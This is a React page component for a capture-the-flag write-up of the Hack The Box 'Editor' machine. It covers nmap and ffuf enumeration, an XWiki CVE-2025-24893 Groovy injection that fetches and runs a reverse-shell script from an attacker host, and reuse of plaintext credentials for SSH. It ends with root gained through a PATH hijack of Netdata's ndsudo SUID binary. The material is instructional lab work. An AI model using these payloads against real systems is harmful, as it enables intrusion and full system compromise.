import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './EditorWalkthrough.css';

const EditorWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // Editor data
  const writeup = {
    id: 'editor-walkthrough',
    title: 'Editor Walkthrough',
    excerpt: 'Full Nmap reconnaissance exposed SSH, nginx and a vulnerable XWiki on Jetty. XWiki RCE gave an xwiki reverse shell, revealed plaintext DB credentials in /etc/xwiki to SSH as oliver, and a writable SUID ndsudo binary was abused via an untrusted-search-path exploit to escalate to root.',
    date: 'Dec 06, 2025',
    tags: ['Htb', 'Linux', 'Xwiki', 'Ndsudo'],
    difficulty: 'Easy',
    os: 'Linux',
    ip: '10.129.136.86',
    content: `# Editor Walkthrough

## Overview
Full Nmap reconnaissance exposed SSH, nginx and a vulnerable XWiki on Jetty. XWiki RCE gave an xwiki reverse shell, revealed plaintext DB credentials in \`/etc/xwiki\` to SSH as oliver, and a writable SUID ndsudo binary was abused via an untrusted-search-path exploit to escalate to root.

## Enumeration
### Port Scanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. The scan reveals a Linux system running Ubuntu with three main services exposed: SSH on port 22, nginx web server on port 80, and a Jetty application server on port 8080 hosting XWiki.
\`\`\`bash
sudo nmap -vv -sS -sV -sC -p- --min-rate=10000 10.129.136.86 -oN nmap/log.nmap

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.136.86:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

Some important open ports are discovered:
• **Port 22**: SSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
• **Port 80**: Nginx 1.18.0
• **Port 8080**: Jetty 10.0.20 - Xwiki

### Service Enumeration
First, add the domain to the hosts file to properly access the web services:
\`\`\`bash
echo "10.129.136.86 editor.htb" | sudo tee -a /etc/hosts
\`\`\`

Accessing the main website on port 80 reveals a redirect to \`editor.htb\` and appears to be a simple landing page. The real target is the XWiki instance running on port 8080.
![Service Enumeration](/images/writeups/editor/1.png)

To discover potential subdomains, use \`ffuf\` to enumerate virtual hosts:
\`\`\`bash
ffuf -u 'http://editor.htb/' -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -c -H 'Host: FUZZ.editor.htb' -fs 154
\`\`\`
![Service Enumeration](/images/writeups/editor/2.png)

A subdomain \`wiki.editor.htb\` is discovered. Add it to the hosts file:
\`\`\`bash
echo "10.129.136.86 wiki.editor.htb" | sudo tee -a /etc/hosts
\`\`\`

Accessing the XWiki instance reveals it's running a version vulnerable to CVE-2025-24893, a remote code execution vulnerability in the SolrSearch RSS feed functionality.
![Service Enumeration](/images/writeups/editor/3.png)
![Service Enumeration](/images/writeups/editor/4.png)

## Foothold
### Exploitation
The vulnerability [CVE-2025-24893](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py) allows remote code execution through the SolrSearch RSS feed by injecting Groovy template code. A publicly available exploit can be used or a custom payload can be crafted.
![Service Enumeration](/images/writeups/editor/5.png)

First, prepare a reverse shell script. The base64 encoded payload decodes to a bash reverse shell:
\`\`\`bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi8yNTU3IDA+JjE= | base64 -d | bash
\`\`\`
![Service Enumeration](/images/writeups/editor/7.png)

The vulnerability is exploited by injecting Groovy code that downloads the reverse shell script. The payload uses XWiki's template syntax to execute Groovy code:
\`\`\`bash
curl -sk "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("""}}}{{async async=false}}{{groovy}}"curl -o /tmp/shell.sh http://10.10.14.22/shell.sh".execute(){{/groovy}}{{/async}}"""))')"
\`\`\`
![Service Enumeration](/images/writeups/editor/6.png)

Next, make the script executable and execute it:
\`\`\`bash
curl -sk "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("""}}}{{async async=false}}{{groovy}}"chmod +x /tmp/shell.sh".execute(){{/groovy}}{{/async}}"""))')"

curl -sk "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("""}}}{{async async=false}}{{groovy}}"/tmp/shell.sh".execute(){{/groovy}}{{/async}}"""))')"
\`\`\`

Set up a netcat listener on the attacking machine. After executing the payload, a reverse shell is received as the \`xwiki\` user:
\`\`\`bash
nc -lnvp 1557
\`\`\`
![Service Enumeration](/images/writeups/editor/8.png)

## Post Exploitation
### Lateral Movement
As the \`xwiki\` user, search for credentials in configuration files. Database credentials are found in plaintext within the XWiki configuration:
\`\`\`bash
grep -iR password .
\`\`\`
![Service Enumeration](/images/writeups/editor/9.png)

The credentials are found in \`/etc/xwiki/hibernate.cfg.xml\` or similar configuration files. These credentials allow SSH access to the machine as the \`oliver\` user.
### User Flag
Using the discovered credentials, SSH into the machine as \`oliver\` and retrieve the user flag:
\`\`\`bash
ssh oliver@10.129.141.193
\`\`\`
![Service Enumeration](/images/writeups/editor/10.png)

## Privilege Escalation
Searching for SUID binaries that could be exploited for privilege escalation:
\`\`\`bash
find / -type f -perm -04000 -ls 2>/dev/null
\`\`\`
![Service Enumeration](/images/writeups/editor/11.png)

It is discovered that \`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo\` is a SUID binary. This binary is part of the Netdata monitoring system and is vulnerable to an untrusted search path attack.
![Service Enumeration](/images/writeups/editor/12.png)

The vulnerability [Netdata SUID Exploit](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) allows us to exploit the PATH environment variable. When \`ndsudo\` executes, it searches for binaries in the PATH. If we can control the PATH and place a malicious binary with a name that \`ndsudo\` tries to execute, we can achieve code execution as root.
![Service Enumeration](/images/writeups/editor/13.png)

### Root Flag
Create a simple C program that sets our UID and GID to 0 (root) and spawns a shell. Name it to \`nvme\` because \`ndsudo\` will try to execute a binary with that name:
\`\`\`C
// gcc -m32 -Wl,--hash-style=both -o suid suid.c
int main(void) {
    setgid(0); setuid(0);
    execl("/bin/sh", "sh", 0);
}
\`\`\`

Compile it on our attacking machine:
\`\`\`C
gcc rev.c -o rev
\`\`\`
![Service Enumeration](/images/writeups/editor/14.png)

Host the compiled binary on our HTTP server:
\`\`\`bash
python3 -m http.server 80
\`\`\`

On the target machine, download our malicious binary, rename it to \`nvme\`, make it executable, add our directory to the PATH, and execute \`ndsudo\` which will run our binary as root:
\`\`\`bash
wget 10.10.14.22/rev
mv rev nvme
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme
\`\`\`
![Service Enumeration](/images/writeups/editor/15.png)

## Conclusion
Editor is an easy-difficulty Linux machine that demonstrates a complete attack chain from initial reconnaissance to root access. The machine showcases real-world vulnerabilities commonly found in web applications and Linux systems, particularly focusing on application-level RCE vulnerabilities and SUID binary exploitation.

The attack path involved:

• **Service Enumeration**: Comprehensive Nmap scanning revealed SSH, nginx, and a vulnerable XWiki instance running on Jetty
• **Subdomain Discovery**: Virtual host enumeration using \`ffuf\` discovered the \`wiki.editor.htb\` subdomain
• **XWiki RCE (CVE-2025-24893)**: Exploiting a remote code execution vulnerability in XWiki's SolrSearch RSS feed functionality through Groovy template injection using the [CVE-2025-24893 exploit](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)
• **Credential Discovery**: Finding plaintext database credentials in XWiki configuration files (\`/etc/xwiki/\`)
• **Lateral Movement**: Using discovered credentials to SSH into the machine as the \`oliver\` user
• **SUID Binary Exploitation**: Exploiting an untrusted search path vulnerability in the Netdata \`ndsudo\` SUID binary ([GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)) to escalate privileges to root

**Tools Used**: Nmap, ffuf, curl, netcat, gcc, Python3, wget

The machine emphasizes the importance of keeping web applications and frameworks up to date to prevent RCE vulnerabilities, never storing credentials in plaintext (especially in configuration files), properly securing SUID binaries and understanding the security implications of PATH manipulation, and implementing defense-in-depth strategies to prevent lateral movement even after initial compromise. This writeup demonstrates how a single vulnerable web application can lead to complete system compromise through a chain of security misconfigurations and vulnerabilities.`
  };

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/editor/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/editor/machine.png" alt="Editor" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default EditorWalkthrough;
